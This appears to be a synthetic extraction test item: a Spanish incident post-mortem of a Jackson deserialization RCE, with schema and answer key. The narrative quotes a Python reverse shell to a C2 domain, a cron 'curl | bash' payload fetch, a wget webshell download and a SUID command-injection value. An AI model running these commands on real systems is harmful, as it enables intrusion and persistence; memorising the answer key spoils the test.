@@ -1,0 +1,400 @@
+{
+  "id": "technical_security_incident_007",
+  "input_text": "# Post-mortem INC-2026-0117 — RCE en API pública de e-commerce vía deserialización insegura\n\n**Clasificación interna:** Confidencial — Equipo de Respuesta a Incidentes (CSIRT) / Plataforma\n**Autor:** SOC Tier 3 con apoyo de Red Team y Plataforma Backend\n**Fecha de cierre del informe:** 30 de mayo de 2026\n**Identificador del incidente:** INC-2026-0117\n**Severidad asignada:** crítica\n\n## 1. Resumen ejecutivo\n\nEl 28 de mayo de 2026 a las 09:42 UTC, una regla de correlación del SIEM (Wazuh + reglas internas de la familia `proc_anomaly`) disparó una alerta de severidad alta sobre el contenedor `ecom-api-prod-7` (namespace `kube-prod/ecommerce`, nodo `node-w12`). El motivo: el proceso `python3 -c 'import socket...'` ejecutándose como hijo de `java`, patrón nunca observado en la línea base de 30 días para ese workload. La investigación reveló que el atacante había obtenido ejecución remota de código en la API pública de e-commerce **48 horas antes**, el 26 de mayo a las 10:14 UTC, explotando una vulnerabilidad de deserialización insegura en la librería Jackson Databind (versión 2.15.2) usada por el endpoint `POST /api/v3/checkout/import-cart` para procesar carritos exportados en formato JSON con polimorfismo habilitado (`enableDefaultTyping`). El vector corresponde al CVE-2025-48311 publicado en abril de 2025 y para el cual existía parche disponible desde el 18 de abril de 2025 que no se aplicó por encontrarse pendiente en el backlog del equipo Backend (ticket BKND-4421, abierto desde el 22 de abril). El atacante desplegó una webshell en `/tmp/.cache/sess_init.jsp`, posteriormente abrió una reverse shell hacia el dominio C2 `update-cdn-eu.tech`, escaló privilegios mediante un binario SUID mal configurado (`/usr/local/bin/healthcheck-wrapper`) y estableció persistencia a través de una entrada cron en `/etc/cron.d/syscheck`. No hay evidencia confirmada de exfiltración masiva de datos de clientes, pero sí se detectó acceso de lectura a la tabla `orders_pii` y a credenciales de un usuario de servicio (`svc-billing-ro`) que han sido revocadas.\n\n## 2. Sistemas afectados\n\n- **API REST de e-commerce** (`ecom-api`, versión 7.4.2-rc1), responsable de los flujos de checkout, gestión de carritos y consulta de catálogo. Pública en `https://api.tienda.example.com`.\n- **Contenedor backend** `ecom-api-prod-7` en el cluster Kubernetes de producción (`kube-prod`), nodo `node-w12`. Imagen base `openjdk:17-slim` con Jackson 2.15.2.\n- **Base de datos lateral** PostgreSQL `db-orders-prod` (instancia RDS interna): el contenedor comprometido tenía credenciales de lectura sobre las tablas `orders`, `orders_pii` y `payment_methods_redacted` a través del usuario de servicio `svc-billing-ro`. La instancia en sí no fue comprometida, pero las credenciales sí fueron expuestas.\n- **Bastión de monitorización** `monitor-bastion-02`: revisado preventivamente porque comparte VLAN de gestión; sin indicios de compromiso.\n\n## 3. Cronología detallada y análisis entrelazado\n\nEsta sección mezcla intencionalmente la reconstrucción cronológica y el análisis técnico, siguiendo el formato del informe original entregado por el SOC.\n\n### 26 de mayo — Acceso inicial y ejecución\n\nA las **10:14 UTC del 26 de mayo de 2026** el atacante envió la primera petición exitosa de explotación desde la dirección IP **45.137.22.198** (geolocalización aparente: Países Bajos; ASN AS208485, hosting `BlueVPS`). La petición fue un `POST /api/v3/checkout/import-cart` con un cuerpo JSON conteniendo un gadget de deserialización polimórfica con `@class = \"org.springframework.context.support.ClassPathXmlApplicationContext\"`, apuntando a un XML hospedado en `http://45.137.22.198:8080/init.xml`. Análisis post-mortem confirmó que el endpoint deserializaba directamente el cuerpo con `ObjectMapper.readValue(body, Object.class)` y `enableDefaultTyping(NON_FINAL)` activo, condición suficiente para que el CVE-2025-48311 fuera explotable contra Jackson Databind 2.15.2. Esto encaja con la fase de **acceso inicial** de la cadena: el atacante no necesitó credenciales, solo el conocimiento del endpoint y una huella previa que se identificó en logs de WAF como **18 peticiones de reconocimiento entre el 24 y el 25 de mayo** desde la misma IP, probando rutas comunes (`/actuator/env`, `/swagger-ui.html`, `/api/v3/checkout/`, `/api/v2/`). Esa actividad pertenece a la fase de **reconocimiento** y fue retrospectivamente clasificada con la técnica MITRE ATT&CK **T1595.002** (Active Scanning: Vulnerability Scanning).\n\nA las **10:14:08 UTC** el XML inducido por la deserialización ejecutó `Runtime.exec` con un downloader `wget` que descargó la webshell `sess_init.jsp` desde `http://45.137.22.198:8080/sess_init.jsp` y la depositó en `/tmp/.cache/sess_init.jsp`. El hash SHA-256 calculado sobre la copia recuperada del contenedor congelado es **`a91f3c0b8d4e2a771ce9b6efba2d4a2f0e5c7d31a4f5b9c2e8d7f1a3b6c5d4e7`**. Esta fase corresponde a **ejecución**, técnica **T1059.007** (no aplicable estrictamente: aquí la técnica más precisa es **T1190**, Exploit Public-Facing Application). El SOC observó posteriormente que el JSP fue accedido cuatro veces entre las 10:15 y las 10:23 UTC mediante peticiones `GET /static-cache/sess_init.jsp?cmd=...`, lo que indica que el atacante usó la webshell para reconocimiento interno: enumeración de variables de entorno, listado de `/etc/passwd`, y verificación de la conectividad saliente.\n\n### 26 de mayo — Reverse shell y consolidación\n\nA las **10:31 UTC** el atacante estableció una reverse shell desde el contenedor hacia el dominio C2 **`update-cdn-eu.tech`** (registrado el 11 de mayo de 2026, NS apuntando a Cloudflare, A record dinámico que rotó tres veces durante el incidente) en el puerto TCP/443. La detección posterior del túnel se logró cruzando logs de NetFlow del nodo `node-w12` con la regla de Suricata `ET POLICY Outbound TLS to Newly Registered Domain`. El comando ejecutado fue una variante Python (`python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('update-cdn-eu.tech',443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')\"`) — éste es exactamente el proceso que dispararía la alerta SIEM dos días después. Esta acción se asigna a **ejecución** con énfasis en establecimiento de canal interactivo (técnica **T1059.006**, Command and Scripting Interpreter: Python).\n\n### 27 de mayo — Escalada y persistencia\n\nDurante la madrugada del 27 de mayo, entre las **02:18 y las 02:47 UTC**, el atacante enumeró binarios SUID dentro del contenedor con `find / -perm -4000 -type f 2>/dev/null`. Identificó `/usr/local/bin/healthcheck-wrapper`, un binario propio compilado por el equipo Plataforma para invocar `kubectl` desde sondas de liveness con SUID root — una configuración considerada un atajo temporal en 2024 y nunca revisada. El wrapper invocaba `system()` con una variable de entorno `HC_TARGET` no saneada, lo que el atacante explotó inyectando `HC_TARGET='; /bin/sh -p'` y obteniendo una shell con **UID 0 efectivo**. Esto corresponde a la fase de **escalada de privilegios**, técnica **T1548.001** (Setuid and Setgid).\n\nCon privilegios elevados, a las **02:53 UTC del 27 de mayo**, el atacante creó la entrada `/etc/cron.d/syscheck` con el contenido `*/15 * * * * root /usr/bin/curl -s http://update-cdn-eu.tech/h | bash` para asegurar persistencia: cada 15 minutos se descargaría y ejecutaría una carga útil refrescada desde el C2. Esta acción se asigna a la fase de **persistencia**, técnica **T1053.003** (Scheduled Task/Job: Cron).\n\n### 27 de mayo — Acceso a credenciales y reconocimiento interno\n\nEntre las **03:05 y las 04:20 UTC del 27 de mayo**, el atacante leyó `/var/run/secrets/db/.env`, archivo montado como volumen secreto que contenía las credenciales del usuario `svc-billing-ro`. Inmediatamente después se observaron 14 consultas SQL legítimas sintácticamente desde el contenedor a `db-orders-prod`, todas de tipo `SELECT` sobre `orders` y `orders_pii`. El volumen de datos transferido fue de aproximadamente 2.3 MB — significativo pero no suficiente para considerarse un volcado completo. Esta fase es **acceso a credenciales**, técnica **T1552.001** (Unsecured Credentials: Credentials In Files).\n\n### 27 y 28 de mayo — Evasión de defensas\n\nA lo largo del 27 de mayo el atacante modificó el timestamp de la webshell con `touch -r /etc/hostname /tmp/.cache/sess_init.jsp` y limpió selectivamente entradas del log de la aplicación (`/var/log/ecom-api/access.log`) correspondientes a sus propias IPs, dejando intacto el resto. Esto corresponde a **evasión de defensas**, técnica **T1070.006** (Timestomp) combinada con **T1070.002** (Indicator Removal: Clear Linux or Mac System Logs). El intento de limpieza fue parcial porque el SIEM ingesta los logs en tiempo real a un índice WORM y la copia central no fue alterada — esto es lo que permitió la reconstrucción exacta de la cronología.\n\n### 28 de mayo — Detección\n\nA las **09:42 UTC del 28 de mayo de 2026** el SIEM disparó la alerta de procesos anómalos. El SOC Tier 1 escaló a Tier 3 en menos de 20 minutos y a las 10:05 UTC se inició la respuesta formal. La fase es **impacto**, aunque el impacto real fue contenido por la velocidad de la respuesta — no se confirmó exfiltración masiva, pero sí lectura de PII y exposición de credenciales.\n\n## 4. Indicadores de compromiso (IoCs)\n\nA continuación se listan los IoCs accionables identificados durante el análisis forense, en el orden en que fueron consolidados por el equipo de inteligencia de amenazas:\n\n- **CVE explotado:** `CVE-2025-48311` (deserialización insegura en Jackson Databind ≤ 2.15.4, vector de polimorfismo con `enableDefaultTyping`). Primera observación en el contexto del incidente: 26 de mayo de 2026.\n- **IP del atacante:** `45.137.22.198` — origen de las peticiones de reconocimiento y de la explotación inicial. Primera observación: 24 de mayo de 2026.\n- **Dominio C2:** `update-cdn-eu.tech` — usado para reverse shell y persistencia. Primera observación: 26 de mayo de 2026.\n- **URL del endpoint vulnerable explotado:** `https://api.tienda.example.com/api/v3/checkout/import-cart`. Primera observación: 26 de mayo de 2026.\n- **Hash SHA-256 de la webshell:** `a91f3c0b8d4e2a771ce9b6efba2d4a2f0e5c7d31a4f5b9c2e8d7f1a3b6c5d4e7`. Primera observación: 26 de mayo de 2026.\n- **Regla YARA de detección de la webshell:** `rule webshell_sess_init_jsp { strings: $s1 = \"Runtime.getRuntime().exec\" $s2 = \"request.getParameter(\\\"cmd\\\")\" $s3 = \"sess_init\" condition: all of them }`. Primera observación: 28 de mayo de 2026, desplegada en el escáner de hosts.\n- **Correo de contacto del registrante del dominio C2:** `abuse-reports@update-cdn-eu.tech` (extraído de WHOIS, presuntamente falso). Primera observación: 28 de mayo de 2026.\n\n## 5. Acciones de contención y remediación\n\nLas acciones se ejecutaron en el siguiente orden temporal a partir de las 10:05 UTC del 28 de mayo:\n\n1. **Aislamiento del contenedor `ecom-api-prod-7`** en una NetworkPolicy de cuarentena (egress denegado, ingress restringido al SOC). Responsable: SOC Tier 3. Estado: completada.\n2. **Reversión del contenedor a la imagen `ecom-api:7.4.1-stable`** (versión anterior, conocida limpia) y redespliegue de las 6 réplicas. Responsable: Plataforma Backend. Estado: completada.\n3. **Aplicación del parche de Jackson Databind**, actualizando a la versión 2.17.1 que incorpora la mitigación de CVE-2025-48311, y deshabilitando explícitamente `enableDefaultTyping` en el `ObjectMapper` del módulo de checkout. Responsable: Equipo Backend. Estado: completada.\n4. **Revocación y rotación de las credenciales del usuario de servicio `svc-billing-ro`**, junto con auditoría de todos los secretos montados en el namespace `kube-prod/ecommerce`. Responsable: Plataforma / SecOps. Estado: completada.\n5. **Segmentación adicional de la VLAN de aplicación** (`vlan-app-prod`) para impedir conectividad saliente directa desde los workloads hacia internet salvo a través del proxy egress autorizado, con allowlist explícita. Responsable: Red. Estado: en_curso (despliegue planificado para el 5 de junio).\n6. **Endurecimiento del binario SUID `/usr/local/bin/healthcheck-wrapper`**: eliminación del bit SUID, reescritura para invocar `kubectl` vía un service account dedicado, y eliminación del paso por variables de entorno no saneadas. Responsable: Plataforma Backend. Estado: completada.\n7. **Despliegue de la regla YARA de la webshell** en el escáner periódico de hosts del cluster y en el pipeline de imágenes. Responsable: SecOps. Estado: completada.\n8. **Auditoría retrospectiva** de logs de los últimos 90 días en busca de explotación previa no detectada del mismo CVE en otros endpoints. Responsable: SOC Tier 3. Estado: pendiente (estimación: dos semanas, dependiente del SLA del equipo de logs centralizados).\n9. **Notificación regulatoria** al DPO interno para evaluar si el acceso a `orders_pii` requiere notificación formal a la autoridad de protección de datos. Responsable: DPO. Estado: en_curso.\n\n## 6. Causa raíz\n\nLa causa raíz del incidente fue la presencia en producción de una versión vulnerable de Jackson Databind (2.15.2) con deserialización polimórfica activada para procesar entradas no confiables en el endpoint público `/api/v3/checkout/import-cart`, combinada con la no aplicación oportuna del parche disponible desde el 18 de abril de 2025 (CVE-2025-48311). El impacto se amplificó por una segunda causa raíz menor: la existencia de un binario SUID propio (`/usr/local/bin/healthcheck-wrapper`) que aceptaba entradas no saneadas, permitiendo la escalada de privilegios dentro del contenedor una vez obtenida la ejecución de código inicial.\n\n## 7. Lecciones aprendidas (informativo, no extraíble)\n\n- Las dependencias críticas con historial de CVEs de deserialización deben tener SLA de parche más estricto que el genérico de 30 días.\n- Cualquier binario SUID propio debe pasar por revisión de seguridad obligatoria y registrarse en un inventario auditado trimestralmente.\n- La regla SIEM de procesos anómalos demostró ser efectiva — el tiempo de detección fue de 48 horas, dentro del objetivo de la organización (72h para incidentes de cadena larga); sin embargo, las fases de reconocimiento previas no dispararon alertas tempranas y deberían correlacionarse mejor con peticiones a rutas inexistentes.\n\n— Fin del informe INC-2026-0117 —",
+  "instruction": "Extrae el informe del incidente de seguridad al esquema SecurityIncident: identificador, fecha de detección, severidad, sistemas afectados, IoCs, cadena de ataque por fase ATT&CK, acciones de contención con estado y causa raíz.",
+  "target_schema": {
+    "$defs": {
+      "AttackPhase": {
+        "description": "Fases de la cadena de ataque (MITRE ATT&CK simplificado).",
+        "enum": [
+          "reconocimiento",
+          "acceso_inicial",
+          "ejecución",
+          "persistencia",
+          "escalada_de_privilegios",
+          "evasión_de_defensas",
+          "acceso_a_credenciales",
+          "movimiento_lateral",
+          "exfiltración",
+          "impacto"
+        ],
+        "title": "AttackPhase",
+        "type": "string"
+      },
+      "AttackStep": {
+        "additionalProperties": false,
+        "description": "Un paso de la cadena de ataque tal como lo reconstruye el informe.",
+        "properties": {
+          "phase": {
+            "$ref": "#/$defs/AttackPhase",
+            "description": "Fase ATT&CK a la que pertenece el paso."
+          },
+          "description": {
+            "description": "Descripción de la acción del atacante en una frase (p. ej. 'Envío de correo de phishing con adjunto malicioso al departamento financiero').",
+            "title": "Description",
+            "type": "string"
+          },
+          "timestamp": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "default": null,
+            "description": "Marca temporal en formato ISO 8601 si el informe la consigna. Null si solo se indica el orden relativo.",
+            "title": "Timestamp"
+          },
+          "technique_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "default": null,
+            "description": "Identificador MITRE ATT&CK si el informe lo cita (p. ej. 'T1566.001'). Null si no aparece.",
+            "title": "Technique Id"
+          }
+        },
+        "required": [
+          "phase",
+          "description"
+        ],
+        "title": "AttackStep",
+        "type": "object"
+      },
+      "ContainmentAction": {
+        "additionalProperties": false,
+        "description": "Acción de contención o remediación tomada por el equipo de respuesta.",
+        "properties": {
+          "description": {
+            "description": "Descripción literal de la acción (p. ej. 'Aislamiento del host afectado en VLAN de cuarentena').",
+            "title": "Description",
+            "type": "string"
+          },
+          "status": {
+            "$ref": "#/$defs/ContainmentStatus",
+            "description": "Estado de ejecución de la acción al cierre del informe."
+          },
+          "owner": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "default": null,
+            "description": "Equipo o persona responsable de la acción (p. ej. 'SOC', 'Red Team'). Null si no se asigna explícitamente.",
+            "title": "Owner"
+          }
+        },
+        "required": [
+          "description",
+          "status"
+        ],
+        "title": "ContainmentAction",
+        "type": "object"
+      },
+      "ContainmentStatus": {
+        "enum": [
+          "pendiente",
+          "en_curso",
+          "completada",
+          "no_aplica"
+        ],
+        "title": "ContainmentStatus",
+        "type": "string"
+      },
+      "Indicator": {
+        "additionalProperties": false,
+        "description": "Indicador de compromiso (IoC) observado durante el incidente.",
+        "properties": {
+          "kind": {
+            "$ref": "#/$defs/IndicatorKind",
+            "description": "Tipo de indicador."
+          },
+          "value": {
+            "description": "Valor literal del indicador tal como aparece en el informe (IP, dominio, SHA-256, CVE-XXXX-XXXX, etc.). Sin modificar.",
+            "title": "Value",
+            "type": "string"
+          },
+          "first_seen": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "default": null,
+            "description": "Fecha en formato ISO en que se observó el indicador por primera vez durante el incidente. Null si el informe no la fecha.",
+            "title": "First Seen"
+          }
+        },
+        "required": [
+          "kind",
+          "value"
+        ],
+        "title": "Indicator",
+        "type": "object"
+      },
+      "IndicatorKind": {
+        "enum": [
+          "ip",
+          "dominio",
+          "url",
+          "hash",
+          "correo",
+          "cve",
+          "regla_yara"
+        ],
+        "title": "IndicatorKind",
+        "type": "string"
+      },
+      "Severity": {
+        "enum": [
+          "baja",
+          "media",
+          "alta",
+          "crítica"
+        ],
+        "title": "Severity",
+        "type": "string"
+      }
+    },
+    "additionalProperties": false,
+    "description": "Post-mortem o informe de respuesta a un incidente de ciberseguridad: IoCs\nobservados, reconstrucción de la cadena de ataque en fases ordenadas\ncronológicamente, sistemas afectados y acciones de contención con su estado.\nLa extracción debe diferenciar fases ATT&CK por su semántica (no por\nel orden literal en el informe, que puede mezclar narrativa y análisis), y\nasociar cada IoC con su tipo correcto a partir de su forma.\n\nComplejidad: L9 — cadena causal con vocabulario técnico denso, taxonomía\nrígida (fases ATT&CK), pluralidad de listas heterogéneas y enlazado\nentre acciones y sistemas.",
+    "properties": {
+      "incident_id": {
+        "description": "Identificador interno del incidente tal como aparece en el informe (p. ej. 'INC-2026-0042').",
+        "title": "Incident Id",
+        "type": "string"
+      },
+      "detection_date": {
+        "description": "Fecha de detección del incidente en formato ISO 8601 ('YYYY-MM-DDTHH:MM' o 'YYYY-MM-DD' si no hay hora).",
+        "title": "Detection Date",
+        "type": "string"
+      },
+      "severity": {
+        "$ref": "#/$defs/Severity",
+        "description": "Severidad declarada del incidente según la clasificación del informe."
+      },
+      "affected_systems": {
+        "description": "Nombres o identificadores de los sistemas, aplicaciones o redes afectados (p. ej. 'CRM corporativo', 'Active Directory', 'VPN'). Un sistema por entrada.",
+        "items": {
+          "type": "string"
+        },
+        "minItems": 1,
+        "title": "Affected Systems",
+        "type": "array"
+      },
+      "indicators": {
+        "description": "IoCs observados durante el incidente. Lista vacía si el informe declara que no se identificaron indicadores accionables.",
+        "items": {
+          "$ref": "#/$defs/Indicator"
+        },
+        "title": "Indicators",
+        "type": "array"
+      },
+      "attack_chain": {
+        "description": "Cadena de ataque reconstruida, en orden cronológico. Cada paso asignado a una única fase ATT&CK.",
+        "items": {
+          "$ref": "#/$defs/AttackStep"
+        },
+        "minItems": 1,
+        "title": "Attack Chain",
+        "type": "array"
+      },
+      "containment_actions": {
+        "description": "Acciones de contención y remediación, en el orden en que fueron ejecutadas o planificadas.",
+        "items": {
+          "$ref": "#/$defs/ContainmentAction"
+        },
+        "minItems": 1,
+        "title": "Containment Actions",
+        "type": "array"
+      },
+      "root_cause": {
+        "description": "Causa raíz declarada por el informe en una o dos frases (p. ej. 'Configuración por defecto del servidor expuesto a internet sin autenticación').",
+        "title": "Root Cause",
+        "type": "string"
+      }
+    },
+    "required": [
+      "incident_id",
+      "detection_date",
+      "severity",
+      "affected_systems",
+      "attack_chain",
+      "containment_actions",
+      "root_cause"
+    ],
+    "title": "SecurityIncident",
+    "type": "object"
+  },
+  "output": {
+    "incident_id": "INC-2026-0117",
+    "detection_date": "2026-05-28T09:42",
+    "severity": "crítica",
+    "affected_systems": [
+      "API REST de e-commerce (ecom-api)",
+      "Contenedor backend ecom-api-prod-7",
+      "Base de datos lateral PostgreSQL db-orders-prod",
+      "Bastión de monitorización monitor-bastion-02"
+    ],
+    "indicators": [
+      {
+        "kind": "cve",
+        "value": "CVE-2025-48311",
+        "first_seen": "2026-05-26"
+      },
+      {
+        "kind": "ip",
+        "value": "45.137.22.198",
+        "first_seen": "2026-05-24"
+      },
+      {
+        "kind": "dominio",
+        "value": "update-cdn-eu.tech",
+        "first_seen": "2026-05-26"
+      },
+      {
+        "kind": "url",
+        "value": "https://api.tienda.example.com/api/v3/checkout/import-cart",
+        "first_seen": "2026-05-26"
+      },
+      {
+        "kind": "hash",
+        "value": "a91f3c0b8d4e2a771ce9b6efba2d4a2f0e5c7d31a4f5b9c2e8d7f1a3b6c5d4e7",
+        "first_seen": "2026-05-26"
+      },
+      {
+        "kind": "regla_yara",
+        "value": "rule webshell_sess_init_jsp { strings: $s1 = \"Runtime.getRuntime().exec\" $s2 = \"request.getParameter(\\\"cmd\\\")\" $s3 = \"sess_init\" condition: all of them }",
+        "first_seen": "2026-05-28"
+      },
+      {
+        "kind": "correo",
+        "value": "abuse-reports@update-cdn-eu.tech",
+        "first_seen": "2026-05-28"
+      }
+    ],
+    "attack_chain": [
+      {
+        "phase": "reconocimiento",
+        "description": "Peticiones de reconocimiento desde la IP del atacante probando rutas comunes (/actuator/env, /swagger-ui.html, /api/v3/checkout/, /api/v2/) detectadas en logs del WAF.",
+        "timestamp": "2026-05-24",
+        "technique_id": "T1595.002"
+      },
+      {
+        "phase": "acceso_inicial",
+        "description": "POST a /api/v3/checkout/import-cart con cuerpo JSON conteniendo un gadget de deserialización polimórfica que explota CVE-2025-48311 contra Jackson Databind 2.15.2.",
+        "timestamp": "2026-05-26T10:14",
+        "technique_id": "T1190"
+      },
+      {
+        "phase": "ejecución",
+        "description": "El XML inducido por la deserialización ejecuta Runtime.exec con un downloader wget que descarga y deposita la webshell sess_init.jsp en /tmp/.cache/sess_init.jsp.",
+        "timestamp": "2026-05-26T10:14:08",
+        "technique_id": null
+      },
+      {
+        "phase": "ejecución",
+        "description": "Establecimiento de reverse shell desde el contenedor hacia el dominio C2 update-cdn-eu.tech en el puerto TCP/443 mediante variante Python (python3 -c socket/pty).",
+        "timestamp": "2026-05-26T10:31",
+        "technique_id": "T1059.006"
+      },
+      {
+        "phase": "escalada_de_privilegios",
+        "description": "Enumeración de binarios SUID y explotación de /usr/local/bin/healthcheck-wrapper inyectando HC_TARGET para obtener una shell con UID 0 efectivo.",
+        "timestamp": "2026-05-27T02:18",
+        "technique_id": "T1548.001"
+      },
+      {
+        "phase": "persistencia",
+        "description": "Creación de la entrada /etc/cron.d/syscheck que cada 15 minutos descarga y ejecuta una carga útil desde el C2 mediante curl.",
+        "timestamp": "2026-05-27T02:53",
+        "technique_id": "T1053.003"
+      },
+      {
+        "phase": "acceso_a_credenciales",
+        "description": "Lectura del archivo /var/run/secrets/db/.env que contenía las credenciales del usuario de servicio svc-billing-ro.",
+        "timestamp": "2026-05-27T03:05",
+        "technique_id": "T1552.001"
+      },
+      {
+        "phase": "evasión_de_defensas",
+        "description": "Modificación del timestamp de la webshell con touch -r y limpieza selectiva de entradas en /var/log/ecom-api/access.log correspondientes a las IPs del atacante.",
+        "timestamp": "2026-05-27",
+        "technique_id": "T1070.006"
+      },
+      {
+        "phase": "impacto",
+        "description": "Detección por el SIEM de la regla de procesos anómalos sobre el contenedor ecom-api-prod-7; acceso confirmado a la tabla orders_pii y exposición de credenciales sin exfiltración masiva confirmada.",
+        "timestamp": "2026-05-28T09:42",
+        "technique_id": null
+      }
+    ],
+    "containment_actions": [
+      {
+        "description": "Aislamiento del contenedor ecom-api-prod-7 en una NetworkPolicy de cuarentena (egress denegado, ingress restringido al SOC).",
+        "status": "completada",
+        "owner": "SOC Tier 3"
+      },
+      {
+        "description": "Reversión del contenedor a la imagen ecom-api:7.4.1-stable y redespliegue de las 6 réplicas.",
+        "status": "completada",
+        "owner": "Plataforma Backend"
+      },
+      {
+        "description": "Aplicación del parche de Jackson Databind actualizando a la versión 2.17.1 y deshabilitación explícita de enableDefaultTyping en el ObjectMapper del módulo de checkout.",
+        "status": "completada",
+        "owner": "Equipo Backend"
+      },
+      {
+        "description": "Revocación y rotación de las credenciales del usuario de servicio svc-billing-ro junto con auditoría de todos los secretos montados en el namespace kube-prod/ecommerce.",
+        "status": "completada",
+        "owner": "Plataforma / SecOps"
+      },
+      {
+        "description": "Segmentación adicional de la VLAN de aplicación vlan-app-prod para impedir conectividad saliente directa hacia internet salvo a través del proxy egress autorizado.",
+        "status": "en_curso",
+        "owner": "Red"
+      },
+      {
+        "description": "Endurecimiento del binario SUID /usr/local/bin/healthcheck-wrapper: eliminación del bit SUID, reescritura para invocar kubectl vía un service account dedicado.",
+        "status": "completada",
+        "owner": "Plataforma Backend"
+      },
+      {
+        "description": "Despliegue de la regla YARA de la webshell en el escáner periódico de hosts del cluster y en el pipeline de imágenes.",
+        "status": "completada",
+        "owner": "SecOps"
+      },
+      {
+        "description": "Auditoría retrospectiva de logs de los últimos 90 días en busca de explotación previa no detectada del mismo CVE en otros endpoints.",
+        "status": "pendiente",
+        "owner": "SOC Tier 3"
+      },
+      {
+        "description": "Notificación regulatoria al DPO interno para evaluar si el acceso a orders_pii requiere notificación formal a la autoridad de protección de datos.",
+        "status": "en_curso",
+        "owner": "DPO"
+      }
+    ],
+    "root_cause": "Presencia en producción de una versión vulnerable de Jackson Databind (2.15.2) con deserialización polimórfica activada para procesar entradas no confiables en el endpoint público /api/v3/checkout/import-cart, combinada con la no aplicación oportuna del parche disponible (CVE-2025-48311); causa secundaria: binario SUID propio healthcheck-wrapper que aceptaba entradas no saneadas permitiendo escalada de privilegios."
+  },
+  "metadata": {
+    "source": "synthetic_20260601_007.md",
+    "domain": "technical",
+    "subdomain": "security_incident"
+  }
+}
